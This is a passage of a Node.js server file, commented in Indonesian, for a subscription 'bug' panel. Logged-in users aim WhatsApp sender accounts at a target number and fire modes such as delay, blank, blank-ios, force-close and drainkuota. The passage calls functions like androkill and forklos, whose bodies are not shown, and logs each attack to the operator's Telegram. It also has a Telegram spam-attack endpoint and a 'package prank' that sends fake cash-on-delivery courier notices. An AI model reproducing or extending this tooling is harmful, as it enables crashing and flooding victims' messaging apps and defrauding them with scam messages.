    console.log(`[INFO] User ${username} has ${activeUserSenders.length} active senders`);

    // Tampilkan halaman execution normal
    return res.send(executionPage("🟥 Ready", {
      message: "Masukkan nomor target dan pilih mode bug",
      activeSenders: activeUserSenders
    }, true, currentUser, "", mode));

  } catch (err) {
    console.error("❌ Fatal error di /execution:", err);
    return res.status(500).send("Internal Server Error");
  }
});

// INI BUAT PANGILAN KE FUNGSINYA
app.post("/execution", requireAuth, async (req, res) => {
  try {
    const username = req.cookies.sessionUser;
    const { target, mode } = req.body;

    if (!target || !mode) {
      return res.status(400).json({ 
        success: false, 
        error: "Target dan mode harus diisi" 
      });
    }

    // Validasi format nomor internasional
    const cleanTarget = target.replace(/\D/g, '');
    
    // Validasi panjang nomor
    if (cleanTarget.length < 7 || cleanTarget.length > 15) {
      return res.status(400).json({
        success: false,
        error: "Panjang nomor harus antara 7-15 digit"
      });
    }

    // Validasi tidak boleh diawali 0
    if (cleanTarget.startsWith('0')) {
      return res.status(400).json({
        success: false,
        error: "Nomor tidak boleh diawali dengan 0. Gunakan format kode negara (contoh: 62, 1, 44, dll.)"
      });
    }

    // Cek session user
    const userSessions = loadUserSessions();
    const userSenders = userSessions[username] || [];
    const activeUserSenders = userSenders.filter(sender => sessions.has(sender));

    if (activeUserSenders.length === 0) {
      return res.status(400).json({
        success: false,
        error: "Tidak ada sender aktif. Silakan tambahkan sender terlebih dahulu."
      });
    }

    // Validasi mode bug
    const validModes = ["delay", "blank", "medium", "drainkuota", "blank-ios", "fcinvsios", "force-close"];
    if (!validModes.includes(mode)) {
      return res.status(400).json({
        success: false,
        error: `Mode '${mode}' tidak valid. Mode yang tersedia: ${validModes.join(', ')}`
      });
    }

    // Eksekusi bug
    const userSender = activeUserSenders[0];
    const sock = sessions.get(userSender);
    
    if (!sock) {
      return res.status(400).json({
        success: false,
        error: "Sender tidak aktif. Silakan periksa koneksi sender."
      });
    }

    const targetJid = `${cleanTarget}@s.whatsapp.net`;
    const country = getCountryCode(cleanTarget);

    // HATI² HARUS FOKUS KALO MAU GANTI NAMA FUNGSI NYA
    let bugResult;
    try {
      if (mode === "delay") {
        bugResult = await delaylow(sock, 24, targetJid);
      } else if (mode === "medium") {
        bugResult = await delayhigh(sock, 24, targetJid);
      } else if (mode === "blank") {
        bugResult = await androkill(sock, targetJid);
      } else if (mode === "blank-ios") {
        bugResult = await blankios(sock, targetJid);
      } else if (mode === "drainkuota") {
        bugResult = await sepong(sock, 24, targetJid);
      } else if (mode === "force-close") {
        bugResult = await forklos(sock, targetJid);
      }

      // Kirim log ke Telegram
      const logMessage = `<blockquote>⚡ <b>New Execution Success - International</b>
      
👤 User: ${username}
📞 Sender: ${userSender}
🎯 Target: ${cleanTarget} (${country})
📱 Mode: ${mode.toUpperCase()}
⏰ Time: ${new Date().toLocaleString("id-ID")}</blockquote>`;

      axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        chat_id: CHAT_ID,
        text: logMessage,
        parse_mode: "HTML"
      }).catch(err => console.error("Gagal kirim log Telegram:", err.message));

      // Update global cooldown
      lastExecution = Date.now();

      res.json({ 
        success: true, 
        message: "Bug berhasil dikirim!",
        target: cleanTarget,
        mode: mode,
        country: country
      });

    } catch (error) {
      console.error(`[EXECUTION ERROR] User: ${username} | Error:`, error.message);
      res.status(500).json({
        success: false,
        error: `Gagal mengeksekusi bug: ${error.message}`
      });
    }

  } catch (error) {
    console.error("❌ Error in POST /execution:", error);
    res.status(500).json({
      success: false,
      error: "Terjadi kesalahan internal server"
    });
  }
});
app.get("/sender-settings", requireAuth, (req, res) => {
    const filePath = path.join(__dirname, "INDICTIVE", "sender-settings.html");
    res.sendFile(filePath);
});

// ==================== SENDER SETTINGS IMPLEMENTATION ==================== //
// Buat map untuk menyimpan setting per sender
const senderFeatures = new Map();

// Fungsi untuk menerapkan settings ke socket
// Terapkan settings ke socket yang sudah terkoneksi
function applySenderSettings(sock, username, botNumber) {
    try {
        console.log(`[SETTINGS] 🛠️ Applying settings to ${botNumber}`);
        
        const allSettings = loadSenderSettings();
        const globalSettings = allSettings._global || {};
        const userSettings = allSettings[username] || {};
        const senderSetting = userSettings[botNumber] || {};
        
        // Gabungkan setting: sender-specific menimpa global
        const settings = { 
            ...globalSettings, 
            ...senderSetting 
        };
        
        console.log(`[${botNumber}] Settings to apply:`, settings);
        
        // Hapus event listeners lama jika ada
        sock.ev.removeAllListeners('messages.upsert');
        sock.ev.removeAllListeners('call');
        
        // Terapkan Auto Read jika aktif
        if (settings.autoread) {
            console.log(`[${botNumber}] ✅ Enabling Auto Read`);
            setupAutoRead(sock, botNumber);
        } else {
            console.log(`[${botNumber}] ❌ Auto Read disabled`);
        }
        
        // Terapkan Anti Call jika aktif
        if (settings.anticall) {
            console.log(`[${botNumber}] ✅ Enabling Anti Call`);
            setupAntiCall(sock, botNumber);
        } else {
            console.log(`[${botNumber}] ❌ Anti Call disabled`);
        }
        
        // Simpan setting ke map
        senderFeatures.set(botNumber, {
            sock: sock,
            settings: settings,
            username: username,
            appliedAt: Date.now()
        });
        
        return true;
    } catch (error) {
        console.error(`[${botNumber}] ❌ Error applying settings:`, error);
        return false;
    }
}
// ==================== FEATURE IMPLEMENTATIONS ==================== //
// ==================== SENDER SETTINGS FUNCTIONS ==================== //
const senderSettingsPath = path.join(__dirname, "sender_settings.json");

// Load sender settings from file
function loadSenderSettings() {
    if (!fs.existsSync(senderSettingsPath)) {
        return {};
    }
    try {
        return JSON.parse(fs.readFileSync(senderSettingsPath, "utf8"));
    } catch (error) {
        console.error("Error loading sender settings:", error);
        return {};
    }
}

// Save sender settings to file
function saveSenderSettings(settings) {
    try {
        fs.writeFileSync(senderSettingsPath, JSON.stringify(settings, null, 2));
    } catch (error) {
        console.error("Error saving sender settings:", error);
    }
}

// Apply settings to a connected sender
function applySenderSettings(sock, username, senderNumber) {
    try {
        console.log(`[SETTINGS] Applying settings to ${senderNumber}`);
        
        const allSettings = loadSenderSettings();
        const globalSettings = allSettings._global || {};
        const userSettings = allSettings[username] || {};
        const senderSetting = userSettings[senderNumber] || {};
        
        // Merge: sender settings override global settings
        const settings = { ...globalSettings, ...senderSetting };
        
        // Auto Read Feature
        if (settings.autoread) {
            sock.ev.on('messages.upsert', async (m) => {
                try {
                    const msg = m.messages[0];
                    if (msg && !msg.key.fromMe && msg.message) {
                        await sock.readMessages([msg.key]);
                    }
                } catch (err) {
                    // Ignore errors
                }
            });
        }
        
        // Anti Toxic Feature
        if (settings.antitoxic) {
            const toxicWords = ['anjing', 'bangsat', 'kontol', 'memek', 'goblok'];
            
            sock.ev.on('messages.upsert', async (m) => {
                try {
                    const msg = m.messages[0];
                    if (!msg || msg.key.fromMe) return;
                    
                    let messageText = '';
                    if (msg.message.conversation) {
                        messageText = msg.message.conversation.toLowerCase();
                    } else if (msg.message.extendedTextMessage?.text) {
                        messageText = msg.message.extendedTextMessage.text.toLowerCase();
                    }
                    
                    if (toxicWords.some(word => messageText.includes(word))) {
                        console.log(`[${senderNumber}] Toxic message detected`);
                    }
                } catch (err) {
                    // Ignore errors
                }
            });
        }
        
        console.log(`[SETTINGS] Settings applied to ${senderNumber}:`, settings);
        return true;
    } catch (error) {
        console.error(`[SETTINGS] Error applying settings:`, error);
        return false;
    }
}
// Auto Read Feature
// === IMPLEMENTASI AUTO READ ===
function setupAutoRead(sock, botNumber) {
    console.log(`[${botNumber}] 🟢 Auto Read enabled`);
    
    sock.ev.on('messages.upsert', async (m) => {
        try {
            const msg = m.messages[0];
            
            // Skip jika pesan dari diri sendiri, broadcast, atau status
            if (msg.key.fromMe || 
                msg.key.remoteJid.includes('broadcast') || 
                msg.key.remoteJid.includes('status') ||
                !msg.message) {
                return;
            }
            
            // Hanya baca pesan yang memiliki messageId
            if (msg.key.id) {
                await sock.readMessages([msg.key]);
                console.log(`[${botNumber}] 📖 Auto read message from ${msg.key.remoteJid}`);
            }
        } catch (error) {
            console.error(`[${botNumber}] Auto read error:`, error.message);
        }
    });
}

// === IMPLEMENTASI ANTI CALL ===
function setupAntiCall(sock, botNumber) {
    console.log(`[${botNumber}] 🟢 Anti Call enabled`);
    
    sock.ev.on('call', async (call) => {
        try {
            console.log(`[${botNumber}] 📞 Call received from ${call.from}`);
            
            // Kirim event ke web interface
            const username = getUsernameFromSender(botNumber);
            if (username) {
                sendEventToUser(username, {
                    type: 'call_received',
                    message: 'Panggilan masuk ditolak',
                    number: botNumber,
                    caller: call.from,
                    timestamp: new Date().toISOString()
                });
            }
            
            // NOTE: Xatabail/WhatsApp Web tidak mendukung reject call secara langsung
            // Alternatif: Kirim pesan otomatis ke penelpon
            try {
                await sock.sendMessage(call.from, {
                    text: `🤖 Bot sedang tidak menerima panggilan. Silakan kirim pesan teks.`
                });
                console.log(`[${botNumber}] 📵 Sent auto message to caller ${call.from}`);
            } catch (msgErr) {
                console.error(`[${botNumber}] Failed to send auto message:`, msgErr.message);
            }
            
        } catch (error) {
            console.error(`[${botNumber}] Anti call error:`, error.message);
        }
    });
}

// Helper function: get username from sender number
function getUsernameFromSender(senderNumber) {
    const userSessions = loadUserSessions();
    for (const [username, numbers] of Object.entries(userSessions)) {
        if (numbers.includes(senderNumber)) {
            return username;
        }
    }
    return null;
}

// ==================== MODIFY CONNECT TO WHATSAPP FUNCTION ==================== //
// Di dalam fungsi connectToWhatsAppUser, tambahkan setelah koneksi terbuka:

// Di dalam blok connection === "open", tambahkan:

// ==================== UPDATE API ROUTES ==================== //
// ==================== SENDER SETTINGS ROUTES ==================== //
app.get("/sender-settings", requireAuth, (req, res) => {
    const filePath = path.join(__dirname, "INDICTIVE", "sender-settings.html");
    res.sendFile(filePath);
});

// API: Get all sender settings
app.get("/api/sender/settings", requireAuth, (req, res) => {
    const username = req.cookies.sessionUser;
    const settings = loadSenderSettings();
    
    res.json({
        success: true,
        global: settings._global || {},
        userSettings: settings[username] || {}
    });
});

// API: Update global settings
app.post("/api/sender/global", requireAuth, (req, res) => {
    const { settings } = req.body;
    
    const allSettings = loadSenderSettings();
    allSettings._global = settings;
    saveSenderSettings(allSettings);
    
    res.json({ success: true, message: "Global settings saved" });
});

// API: Update sender-specific settings
app.post("/api/sender/update", requireAuth, (req, res) => {
    const username = req.cookies.sessionUser;
    const { senderNumber, settings } = req.body;
    
    const allSettings = loadSenderSettings();
    
    if (!allSettings[username]) {
        allSettings[username] = {};
    }
    
    allSettings[username][senderNumber] = settings;
    saveSenderSettings(allSettings);
    
    // Apply settings if sender is online
    const sock = sessions.get(senderNumber);
    if (sock) {
        applySenderSettings(sock, username, senderNumber);
    }
    
    res.json({ success: true, message: "Sender settings updated" });
});

// API: Get active senders with status
app.get("/api/sender/status", requireAuth, (req, res) => {
    const username = req.cookies.sessionUser;
    const userSessions = loadUserSessions();
    const userSenders = userSessions[username] || [];
    
    const sendersWithStatus = userSenders.map(sender => ({
        number: sender,
        online: sessions.has(sender),
        lastSeen: new Date().toISOString()
    }));
    
    res.json({ success: true, senders: sendersWithStatus });
});

// API: Restart sender
app.post("/api/sender/restart", requireAuth, async (req, res) => {
    const username = req.cookies.sessionUser;
    const { senderNumber } = req.body;
    
    try {
        // Check if sender exists in user sessions
        const userSessions = loadUserSessions();
        if (!userSessions[username] || !userSessions[username].includes(senderNumber)) {
            return res.json({ success: false, error: "Sender not found" });
        }
        
        // Disconnect if connected
        if (sessions.has(senderNumber)) {
            const sock = sessions.get(senderNumber);
            try {
                await sock.logout();
            } catch (err) {
                // Ignore logout errors
            }
            sessions.delete(senderNumber);
        }
        
        // Reconnect
        const sessionDir = userSessionPath(username, senderNumber);
        await connectToWhatsAppUser(username, senderNumber, sessionDir);
        
        res.json({ success: true, message: "Sender restarted" });
    } catch (error) {
        res.json({ success: false, error: error.message });
    }
});
// API: Get current sender features status
app.get("/api/sender/features", requireAuth, (req, res) => {
    const username = req.cookies.sessionUser;
    const userSessions = loadUserSessions();
    const userSenders = userSessions[username] || [];
    
    const features = userSenders.map(sender => {
        const sock = sessions.get(sender);
        const featureData = senderFeatures.get(sender);
        
        return {
            number: sender,
            online: !!sock,
            features: featureData ? featureData.settings : {},
            uptime: featureData ? featureData.uptime : 0
        };
    });
    
    res.json({ success: true, features });
});
// Testing function untuk cek apakah Auto Read bekerja
app.get("/api/test-autoread", requireAuth, async (req, res) => {
    const username = req.cookies.sessionUser;
    const userSessions = loadUserSessions();
    const userSenders = userSessions[username] || [];
    
    let results = [];
    
    for (const sender of userSenders) {
        const sock = sessions.get(sender);
        if (sock) {
            results.push({
                sender: sender,
                online: true,
                settings: senderFeatures.get(sender)?.settings || {},
                listenerCount: {
                    messages: sock.listenerCount('messages.upsert'),
                    call: sock.listenerCount('call')
                }
            });
        }
    }
    
    res.json({ success: true, results });
});
// API: Update feature settings in real-time
// API: Update sender feature
app.post("/api/sender/update-feature", requireAuth, async (req, res) => {
    const username = req.cookies.sessionUser;
    const { number, feature, value } = req.body;
    
    if (!number || !feature) {
        return res.json({ success: false, error: "Data tidak lengkap" });
    }
    
    try {
        // 1. Update di settings file
        const settings = loadSenderSettings();
        
        if (!settings[username]) {
            settings[username] = {};
        }
        
        if (!settings[username][number]) {
            settings[username][number] = {};
        }
        
        settings[username][number][feature] = value;
        saveSenderSettings(settings);
        
        // 2. Apply langsung ke socket jika online
        const sock = sessions.get(number);
        if (sock) {
            console.log(`[API] Applying ${feature}=${value} to ${number}`);
            
            // Hapus listener lama untuk fitur ini
            if (feature === 'autoread') {
                sock.ev.removeAllListeners('messages.upsert');
                if (value === true) {
                    setupAutoRead(sock, number);
                }
            } else if (feature === 'anticall') {
                sock.ev.removeAllListeners('call');
                if (value === true) {
                    setupAntiCall(sock, number);
                }
            }
            
            // Update senderFeatures map
            if (senderFeatures.has(number)) {
                const featureData = senderFeatures.get(number);
                featureData.settings[feature] = value;
                senderFeatures.set(number, featureData);
            }
        }
        
        res.json({ 
            success: true, 
            message: `Feature ${feature} updated to ${value}` 
        });
    } catch (error) {
        console.error("Error updating feature:", error);
        res.json({ success: false, error: error.message });
    }
});
// API: Restart sender dengan settings baru
app.post("/api/sender/restart", requireAuth, async (req, res) => {
    const username = req.cookies.sessionUser;
    const { number } = req.body;
    
    if (!number) {
        return res.json({ success: false, error: "Nomor tidak valid" });
    }
    
    try {
        // Cek apakah sender ada
        const userSessions = loadUserSessions();
        if (!userSessions[username] || !userSessions[username].includes(number)) {
            return res.json({ success: false, error: "Sender tidak ditemukan" });
        }
        
        // Jika sedang online, logout dulu
        if (sessions.has(number)) {
            const sock = sessions.get(number);
            await sock.logout();
            sessions.delete(number);
            senderFeatures.delete(number);
        }
        
        // Reconnect dengan settings baru
        const sessionDir = userSessionPath(username, number);
        const sock = await connectToWhatsAppUser(username, number, sessionDir);
        
        if (sock) {
            res.json({ 
                success: true, 
                message: "Sender restarted dengan settings baru" 
            });
        } else {
            res.json({ 
                success: false, 
                error: "Gagal restart sender" 
            });
        }
    } catch (error) {
        res.json({ success: false, error: error.message });
    }
});
// ==================== AUTH MIDDLEWARE ==================== //
// Route untuk halaman YouTube Downloader
app.get("/youtube-downloader", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "INDICTIVE", "youtube-downloader.html");
  res.sendFile(filePath);
});

app.post('/api/youtube/search', requireAuth, async (req, res) => {
  const { query } = req.body;
  
  if (!query) {
    return res.status(400).json({ error: "Query pencarian wajib diisi." });
  }

  try {
    // Coba multiple API endpoints untuk redundancy
    const apiEndpoints = [
      `https://api.siputzx.my.id/api/s/youtube?query=${encodeURIComponent(query)}`,
      `https://api.nvidiabotz.xyz/search/youtube?q=${encodeURIComponent(query)}`,
      `https://yt-api.mojokertohost.xyz/search?q=${encodeURIComponent(query)}`
    ];

    let searchData = null;
    
    for (const endpoint of apiEndpoints) {
      try {
        console.log(`Mencoba API: ${endpoint}`);
        const response = await axios.get(endpoint, { timeout: 10000 });
        
        if (response.data && (response.data.data || response.data.result)) {
          searchData = response.data.data || response.data.result;
          console.log(`Berhasil dengan API: ${endpoint}`);
          break;
        }
      } catch (apiError) {
        console.log(`API ${endpoint} gagal:`, apiError.message);
        continue;
      }
    }

    if (!searchData) {
      return res.status(404).json({ 
        error: "Semua API tidak merespons. Coba lagi nanti." 
      });
    }

    // Format response secara konsisten
    const formattedResults = Array.isArray(searchData) ? searchData : [searchData];
    
    return res.json({
      success: true,
      results: formattedResults
    });

  } catch (error) {
    console.error('YouTube Search Error:', error.message);
    res.status(500).json({ 
      error: "Gagal mencari video. Coba gunakan kata kunci lain." 
    });
  }
});

app.post('/api/youtube/download', requireAuth, async (req, res) => {
  const { url } = req.body;
  
  if (!url) {
    return res.status(400).json({ error: "URL video YouTube wajib diisi." });
  }

  try {
    // Multiple download API endpoints
    const downloadEndpoints = [
      `https://restapi-v2.simplebot.my.id/download/ytmp3?url=${encodeURIComponent(url)}`,
      `https://api.azz.biz.id/download/ytmp3?url=${encodeURIComponent(url)}`,
      `https://yt-api.mojokertohost.xyz/download?url=${encodeURIComponent(url)}&type=mp3`
    ];

    let downloadUrl = null;
    let audioTitle = "YouTube Audio";
    
    for (const endpoint of downloadEndpoints) {
      try {
        console.log(`Mencoba download API: ${endpoint}`);
        const response = await axios.get(endpoint, { timeout: 15000 });
        
        if (response.data && response.data.result) {
          downloadUrl = response.data.result;
          audioTitle = response.data.title || "YouTube Audio";
          console.log(`Berhasil dengan download API: ${endpoint}`);
          break;
        }
      } catch (apiError) {
        console.log(`Download API ${endpoint} gagal:`, apiError.message);
        continue;
      }
    }

    if (!downloadUrl) {
      return res.status(404).json({ 
        error: "Tidak dapat mengunduh audio. Coba video lain." 
      });
    }

    return res.json({
      success: true,
      audioUrl: downloadUrl,
      title: audioTitle
    });

  } catch (error) {
    console.error('YouTube Download Error:', error.message);
    res.status(500).json({ 
      error: "Terjadi kesalahan saat memproses download." 
    });
  }
});
app.get("/test-speed", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "INDICTIVE", "test-speed.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});
app.get("/spam-telegram", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "INDICTIVE", "spam-telegram.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});
app.get("/pinterest-downloader", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "INDICTIVE", "pinterest-downloader.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});
app.get("/anime", (req, res) => {
  res.sendFile(path.join(__dirname, "INDICTIVE", "anime.html"));
});
/*app.get("/anime", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "INDICTIVE", "anime.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});*/
app.get("/nsfw-anime", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "INDICTIVE", "nsfw-anime.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});
// Route untuk TikTok (HANYA bisa diakses setelah login)
app.get("/tt", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "INDICTIVE", "tiktok.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});
// ==================== ROUTE PACKAGE PRANK ==================== //
app.get("/package-prank", requireAuth, (req, res) => {
    const filePath = path.join(__dirname, "INDICTIVE", "package-prank.html");
    res.sendFile(filePath);
});

// API untuk mengirim package prank
app.post("/api/send-package-prank", requireAuth, async (req, res) => {
    const username = req.cookies.sessionUser;
    const { targetNumber, packageData } = req.body;

    // Validasi
    if (!targetNumber || !packageData) {
        return res.json({ success: false, error: "Data tidak lengkap" });
    }

    // Cari sender aktif untuk user ini
    const userSessions = loadUserSessions();
    const userSenders = userSessions[username] || [];
    const activeUserSenders = userSenders.filter(sender => sessions.has(sender));

    if (activeUserSenders.length === 0) {
        return res.json({ success: false, error: "Tidak ada sender aktif" });
    }

    try {
        // Gunakan sender pertama yang aktif
        const userSender = activeUserSenders[0];
        const sock = sessions.get(userSender);

        if (!sock) {
            return res.json({ success: false, error: "Sender tidak aktif" });
        }

        // Kirim package prank
        const result = await sendPackagePrank(sock, targetNumber, packageData);
        res.json(result);
    } catch (error) {
        res.json({ success: false, error: error.message });
    }
});

// ==================== PACKAGE PRANK FUNCTION ==================== //
async function sendPackagePrank(sock, targetNumber, packageData) {
    try {
        const message = `Halo Bapak/Ibu, paket Anda dengan nomor resi ${packageData.resi} (${packageData.kurir}) sedang dalam perjalanan ke alamat Anda.

📦 INFORMASI PENGIRIMAN
Kurir: ${packageData.kurir}
Nomor Resi: ${packageData.resi}
Penerima: Bapak/Ibu
Barang: ${packageData.barang}
Metode: COD
Jumlah: ${packageData.harga}

Status: ${packageData.status || "DALAM PERJALANAN"}
Estimasi: ${packageData.estimasi || "Hari ini (4-5 jam lagi)"}

Mohon siapkan uang tunai untuk pembayaran COD. Driver akan menghubungi Anda 30 menit sebelum tiba.`;

        // Kirim pesan ke WhatsApp
        await sock.sendMessage(`${targetNumber}@s.whatsapp.net`, {
            text: message
        });

        return { success: true, message: "Paket prank berhasil dikirim!" };
    } catch (error) {
        console.error("Error sending package prank:", error);
        return { success: false, error: error.message };
    }
}
app.get("/myinfo", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "INDICTIVE", "profil.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/qr", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "INDICTIVE", "qr.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/quote", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "INDICTIVE", "iqc.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/music", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "INDICTIVE", "music.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});
app.get("/test-speed", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "INDICTIVE", "test-speed.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/get-code", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "INDICTIVE", "get-code");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

// API Endpoint (Proxy)
app.get('/api/nsfw/random', requireAuth, async (req, res) => {
  try {
    // Multiple API endpoints sebagai fallback
    const apiEndpoints = [
      'https://api.waifu.pics/nsfw/waifu',
      'https://api.waifu.pics/nsfw/neko',
      'https://api.waifu.pics/nsfw/blowjob',
      'https://nekos.life/api/v2/img/nsfw_neko_gif',
      'https://nekos.life/api/v2/img/lewd',
      'https://purrbot.site/api/img/nsfw/neko/gif'
    ];

    let imageUrl = null;
    let attempts = 0;

    // Coba semua API endpoints sampai dapat yang work
    for (const endpoint of apiEndpoints) {
      attempts++;
      try {
        console.log(`Mencoba API: ${endpoint}`);
        const response = await axios.get(endpoint, { timeout: 10000 });
        
        // Handle response berdasarkan struktur yang berbeda
        if (response.data) {
          if (response.data.url) {
            imageUrl = response.data.url;
          } else if (response.data.image) {
            imageUrl = response.data.image;
          } else if (response.data.message) {
            imageUrl = response.data.message;
          } else if (response.data.result) {
            imageUrl = response.data.result;
          }
        }

        if (imageUrl) {
          console.log(`✅ Berhasil dengan API: ${endpoint}`);
          break;
        }
      } catch (apiError) {
        console.log(`❌ API ${endpoint} gagal:`, apiError.message);
        continue;
      }
    }

    if (imageUrl) {
      return res.json({
        success: true,
        image: imageUrl
      });
    } else {
      return res.status(404).json({ 
        error: "Semua API tidak merespons. Coba lagi nanti." 
      });
    }

  } catch (error) {
    console.error('NSFW API Error:', error.message);
    res.status(500).json({ 
      error: "Gagal mengambil gambar. Server API sedang gangguan." 
    });
  }
});
// Route untuk halaman My Senders
app.get("/sender", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "INDICTIVE", "sender.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) {
      console.error("❌ Gagal membaca file sender.html:", err);
      return res.status(500).send("File sender.html tidak ditemukan");
    }
    res.send(html);
  });
});
// Route untuk halaman My Senders

// API untuk mendapatkan daftar sender user
app.get("/api/mysenders", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const userSessions = loadUserSessions();
  const userSenders = userSessions[username] || [];
  
  res.json({ 
    success: true, 
    senders: userSenders,
    total: userSenders.length
  });
});

// SSE endpoint untuk events real-time
app.get("/api/events", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  
  res.writeHead(200, {
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Access-Control-Allow-Origin': '*',
  });

  // Simpan response object untuk user ini
  userEvents.set(username, res);

  // Kirim heartbeat setiap 30 detik
  const heartbeat = setInterval(() => {
    try {
      res.write(': heartbeat\n\n');
    } catch (err) {
      clearInterval(heartbeat);
    }
  }, 30000);

  // Cleanup saat connection close
  req.on('close', () => {
    clearInterval(heartbeat);
    userEvents.delete(username);
  });

  // Kirim event connection established
  res.write(`data: ${JSON.stringify({ type: 'connected', message: 'Event stream connected' })}\n\n`);
});
// ==================== AUTH MIDDLEWARE ==================== //
// ==================== AUTH MIDDLEWARE ==================== //
function requireAuth(req, res, next) {
  console.log('🔐 [AUTH MIDDLEWARE] Checking authentication for:', req.path);
  
  // Initialize cookies if undefined
  req.cookies = req.cookies || {};
  
  // Debug log
  console.log('🍪 Cookies object:', req.cookies);
  console.log('📋 Cookie header:', req.headers.cookie);
  
  // Parse cookies manually if cookie-parser not working
  if (!req.cookies.sessionUser && req.headers.cookie) {
    console.log('🔄 Parsing cookies manually...');
    const cookies = {};
    req.headers.cookie.split(';').forEach(cookie => {
      const parts = cookie.trim().split('=');
      if (parts.length >= 2) {
        cookies[parts[0]] = decodeURIComponent(parts.slice(1).join('='));
      }
    });
    req.cookies = cookies;
    console.log('✅ Parsed cookies:', cookies);
  }
  
  const username = req.cookies.sessionUser;
  
  if (!username || username === 'undefined' || username === 'null') {
    console.log('❌ No valid session found for path:', req.path);
    
    // Untuk route API, return JSON error
    if (req.path.startsWith('/api/')) {
      return res.status(401).json({ 
        success: false, 
        error: "Authentication required" 
      });
    }
    
    // Untuk halaman web, redirect ke login
    return res.redirect("/login?msg=Silakan login terlebih dahulu&redirect=" + encodeURIComponent(req.originalUrl));
  }
  
  console.log('✅ User authenticated:', username);
  
  // Cek user di database
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  
  if (!currentUser) {
    console.log('❌ User not found in database:', username);
    if (req.path.startsWith('/api/')) {
      return res.status(401).json({ success: false, error: "User not found" });
    }
    return res.redirect("/login?msg=User tidak ditemukan");
  }
  
  // Cek expired
  if (Date.now() > currentUser.expired) {
    console.log('❌ Session expired for:', username);
    if (req.path.startsWith('/api/')) {
      return res.status(401).json({ success: false, error: "Session expired" });
    }
    return res.redirect("/login?msg=Session expired, login ulang");
  }
  
  console.log('✅ Authentication successful for:', username);
  
  // Attach user info ke request
  req.user = currentUser;
  req.username = username;
  
  next();
}

// Route untuk serve HTML Telegram Spam
app.get('/telegram-spam', (req, res) => {
    const username = req.cookies.sessionUser;
    if (!username) {
        return res.redirect('/login');
    }
    res.sendFile(path.join(__dirname, 'INDICTIVE', 'telegram-spam.html'));
});

// API endpoint untuk spam Telegram
app.post('/api/telegram-spam', async (req, res) => {
    try {
        const username = req.cookies.sessionUser;
        if (!username) {
            return res.json({ success: false, error: 'Unauthorized' });
        }

        const { token, chatId, count, delay, mode } = req.body;
        
        if (!token || !chatId || !count || !delay || !mode) {
            return res.json({ success: false, error: 'Missing parameters' });
        }

        // Validasi input
        if (count > 1000) {
            return res.json({ success: false, error: 'Maximum count is 1000' });
        }

        if (delay < 100) {
            return res.json({ success: false, error: 'Minimum delay is 100ms' });
        }

        // Protected targets - tidak boleh diserang
        const protectedTargets = ['@AiiSigma', '7250235697'];
        if (protectedTargets.includes(chatId)) {
            return res.json({ success: false, error: 'Protected target cannot be attacked' });
        }

        // Kirim log ke Telegram owner
        const logMessage = `<blockquote>🔰 <b>New Telegram Spam Attack</b>
        
👤 User: ${username}
🎯 Target: ${chatId}
📱 Mode: ${mode.toUpperCase()}
🔢 Count: ${count}
⏰ Delay: ${delay}ms
🕐 Time: ${new Date().toLocaleString("id-ID")}</blockquote>`;

        try {
            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                chat_id: CHAT_ID,
                text: logMessage,
                parse_mode: "HTML"
            });
        } catch (err) {
            console.error("Gagal kirim log Telegram:", err.message);
        }

        // Return success untuk trigger frontend
        res.json({ 
            success: true, 
            message: 'Attack started successfully',
            attackId: Date.now().toString()
        });

    } catch (error) {
        console.error('Telegram spam error:', error);
        res.json({ success: false, error: 'Internal server error' });
    }
});

// ============================================
const userTracking = {
  requests: new Map(), // Track per user
  targets: new Map(),  // Track per target
  
  // Reset otomatis tiap 24 jam
  resetDaily() {
    this.requests.clear();
    this.targets.clear();
    console.log('🔄 Daily tracking reset');
  },
  
  // Cek apakah user sudah melebihi limit harian
